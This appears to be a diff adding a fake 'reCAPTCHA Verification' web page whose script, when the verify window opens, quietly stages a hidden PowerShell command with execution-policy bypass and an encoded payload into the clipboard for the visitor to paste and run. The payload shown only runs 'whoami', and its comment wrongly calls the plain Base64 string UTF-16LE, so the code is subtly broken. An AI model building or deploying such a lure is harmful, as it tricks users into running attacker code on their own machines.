@@ -1,1 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>reCAPTCHA Verification</title>
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
+        <style>
+        /* [CSS remains unchanged for brevity] */
+        </style>
+    </head>
+    <body>
+    <!-- [HTML structure remains unchanged] -->
+    <script>
+        // [Existing JS functions remain unchanged]
+
+        function showVerifyWindow() {
+            verifywindow.style.display = "block";
+            verifywindow.style.visibility = "visible";
+            verifywindow.style.opacity = "1";
+            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
+
+            if (verifywindow.offsetTop < 5) {
+               verifywindow.style.top = "5px";
+            }
+            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
+               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
+            }
+
+            var verification_id = generateRandomNumber();
+            document.getElementById('verification-id').textContent = verification_id;
+            
+            // 🔹 CHANGED: PowerShell with UTF-16LE Base64 encoded command
+            // "whoami" -> UTF-16LE -> Base64 = "d2hvYW1p"
+            const commandToRun = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand d2hvYW1p";
+            stageClipboard(commandToRun, verification_id);
+        }
+
+        addCaptchaListeners();
+    </script>
+    </body>
+</html>
 
